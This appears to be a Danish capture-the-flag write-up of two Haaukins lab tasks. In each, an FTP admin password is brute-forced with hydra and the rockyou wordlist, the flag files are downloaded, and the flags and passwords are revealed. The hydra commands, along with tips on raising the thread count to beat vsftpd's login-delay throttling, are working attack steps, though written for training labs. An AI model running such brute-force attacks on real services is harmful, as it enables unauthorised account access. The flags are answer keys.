Secure FTP Server & FTP Server Login

To opgaver, samme metode, men én detalje om tråd-antal afgør om det er hurtigt eller smertefuldt.

ForensicsHaaukins CTF
🎓 Prøv selv først. Trinnene viser metoden, det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er fremgangsmåden der tæller.
📚 Baggrund: denne opgave bygger på en fælles teknik. Læs primeren: Kom i gang: VPN, Hosts og lab-opsætning.

Secure FTP Server: standardmetoden

Host secure-ftp.com, vsftpd, anonym adgang nægtet. Opgaveteksten giver brugernavnet direkte: "weak login credentials... username admin".

hydra -l admin -P rockyou.txt -t 8 -f ftp://<ip>
# admin:123qwe
ftp <ip>   # login admin / 123qwe
get oh-no.txt

Flaget ligger i oh-no.txt efter login.

FTP Server Login: samme opskrift, men langsommere uden justering

Host ftplogin.com, samme "Haaukins FTP Server Challenge!"-banner, også anonym nægtet. Opgaveteksten hinter selv ordlisten: "log in as admin ... (Go john!)", "Go john!" er et praj om John the Ripper-slangets standard-ordliste, rockyou.

hydra -l admin -P rockyou.txt -t 16 ftp://<ip>
# admin:thunderbird
ftp <ip>   # login admin / thunderbird
get donotopen.txt

Vigtig forskel fra den første opgave: vsftpds delay_failed_login gør bruten mærkbart langsommere ved lavt trådantal. -t 16 i stedet for -t 4/-t 8 gav her omkring 4x hurtigere gennemløb, uden at tjenesten afviste forbindelserne (modsat SSH, hvor for mange tråde typisk er kontraproduktivt).

🚩 Vis løsning & eksempel-flag

Secure FTP Server: HKN{Y0u_4re_Th3_k1nG_0f_bRu7ef0rCe}

FTP Server Login (per-instans): HKN{6O-bBf-hZUrh}

Hvad du har lært

  • Opgavetekster kan selv hinte ordlisten ('Go john!' = John the Ripper/rockyou-konventionen).
  • Antal parallelle tråde er ikke universelt 'færre er bedre', vsftpd med delay_failed_login tåler og belønner flere tråde (-t 16), modsat SSH der ofte straffer det.
  • Passwordene er sandsynligvis per-instans, ikke bekræftet statiske på tværs af lab-genstarter, gen-brute hvis de ikke virker ved et nyt besøg.

Hvor ses dette igen?

To næsten identiske opgaver kan stadig have én afgørende, ikke-oplagt forskel, her trådantallet. Antag aldrig at samme teknik mod samme tjenestetype opfører sig ens, tjek altid om den konkrete instans reagerer anderledes (throttling, lockout-vinduer, rate-limits) før du antager din første indstilling var optimal.
